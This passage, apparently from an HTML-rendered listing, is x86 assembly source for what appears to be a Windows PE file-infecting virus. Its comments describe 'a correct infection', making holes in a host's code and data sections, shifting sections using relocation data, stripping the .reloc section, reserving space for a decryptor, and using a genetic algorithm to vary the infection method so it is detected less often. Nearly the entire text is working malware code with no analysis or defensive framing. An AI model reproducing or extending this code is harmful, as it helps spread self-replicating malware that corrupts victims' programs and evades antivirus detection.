                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Set the last header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">            </span><span class="sc1">; Next header</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; If it wasn't the last one,</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; continue checking</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopSections</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Initialize the addresses that</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; we need for making</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; a correct infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; If we haven't retrieved a</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; code or data section, we</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">                   </span><span class="sc1">; exit with error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DataHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; IF we have .reloc section,</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; we'll make section shifting.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRelocs</span><span class="sc0">    </span><span class="sc1">; If not, try another alternative method.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X000_3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Although there is .reloc section, don't</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRelocs2</span><span class="sc0">   </span><span class="sc1">; make that infection always. Doing this,</span><span class="sc0">
                                    </span><span class="sc1">; we have a not fixed way of infecting.</span><span class="sc0">
                         </span><span class="sc1">; Moreover, it's selected by our genetic algorithm,</span><span class="sc0">
                         </span><span class="sc1">; which makes that if it's not viable (i.e. it's</span><span class="sc0">
                         </span><span class="sc1">; more detected) the probability is lower.</span><span class="sc0">

</span><span class="sc1">;; Now we are going to make section shifting. We use the relocation section</span><span class="sc0">
</span><span class="sc1">;; to update all the pointers that point to data that is going to be shifted</span><span class="sc0">
</span><span class="sc1">;; down,</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">   </span><span class="sc1">; Avoid .reloc section in the middle</span><span class="sc0">

                </span><span class="sc1">;; Everything is OK to start!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Mark that we are doing the hole</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; at the code section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">       </span><span class="sc1">; Maximum size of decryptor</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateHeaders</span><span class="sc0">    </span><span class="sc1">; Make the hole.</span><span class="sc0">
                </span><span class="sc1">; Returns:</span><span class="sc0">
                </span><span class="sc1">; ECX = Unchanged</span><span class="sc0">
                </span><span class="sc1">; EAX = Physical offset of created hole, or NULL if error</span><span class="sc0">
                </span><span class="sc1">; EDI = RVA of hole</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHoleSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; If ExitProcess is not imported by the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">         </span><span class="sc1">; host, finish (undoing the changes)</span><span class="sc0">
             </span><span class="sc1">;   mov     eax, [ebp+VirtualAllocAddress]</span><span class="sc0">
             </span><span class="sc1">;   or      eax, eax</span><span class="sc0">
             </span><span class="sc1">;   jz    @@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Check the import of the GetProcAddress.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">        </span><span class="sc1">; If it's not imported, error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; If the host doesn't import GetModuleHandle,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">     </span><span class="sc1">; finish with error</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; Add the size of the hole to</span><span class="sc0">
                                             </span><span class="sc1">; the size of code in the exec.</span><span class="sc0">
                                             </span><span class="sc1">; header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; Add it to the track size too.</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; Set that we are making</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the second hole.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DataHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RoundedSizeOfNewCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateHeaders</span><span class="sc0">             </span><span class="sc1">; Make the data hole</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_DataHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Set the physical and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_DataHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;  virtual addresses.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Now we are going to update</span><span class="sc0">
                                                  </span><span class="sc1">; the addresses of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; functions. We don't</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; need to check that</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; they have a value</span><span class="sc0">
                                                   </span><span class="sc1">; because we know that they</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; have it. If not,</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; we had exited when</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; making the first</span><span class="sc0">
                                                        </span><span class="sc1">; hole (the code hole)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; If we have VirtualAlloc</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontAddBaseAddress</span><span class="sc0">     </span><span class="sc1">; available, update it also</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@DontAddBaseAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Increase the virtual size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; of the data in the file and</span><span class="sc0">
                                               </span><span class="sc1">; the file size itself</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Set the new image size of</span><span class="sc0">
                                               </span><span class="sc1">; the executable.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Now set the physical size of</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">; the file in the FileSize var,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; so when closing the file</span><span class="sc0">
                                              </span><span class="sc1">; mapping we'll set the new</span><span class="sc0">
                                              </span><span class="sc1">; physical size (i.e. eliminate</span><span class="sc0">
                                              </span><span class="sc1">; the .reloc section).</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Fill with 0s the .reloc</span><span class="sc0">
     </span><span class="sc5">@@Loop0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; section</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">       </span><span class="sc1">; Now eliminate the .reloc header in</span><span class="sc0">
     </span><span class="sc5">@@Loop1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; the PE header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop1</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0A0h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Eliminate the relocation entry in</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; the list of directories</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Decrease the number of sections</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Set that the reloc info has been</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; stripped from the file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">    </span><span class="sc1">; Set the maximum size of the decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; to 1000h (the maximum</span><span class="sc0">
                                                      </span><span class="sc1">; size we use for it)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Set "ALL OK" on returning</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
         </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set "ERROR"!</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;; This code is reached when the .reloc section exists, but we want to make</span><span class="sc0">
</span><span class="sc1">;; an infection as if there isn't a .reloc section. In this way the behaviour</span><span class="sc0">
</span><span class="sc1">;; of the infection method is not fixed.</span><span class="sc0">
     </span><span class="sc5">@@NoRelocs2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Set the .reloc address to 0 as if</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; there wasn't .reloc section</span><span class="sc0">

     </span><span class="sc5">@@NoRelocs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Retrieve the required function</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; addresses.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateImports</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Check every function</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; address (and exit with</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">; error if they couldn't</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">                         </span><span class="sc1">; be retrieved) and get</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; the final virtual addr.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; of every one, adding</span><span class="sc0">
                                                      </span><span class="sc1">; the image base.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">]</span><span class="sc0">
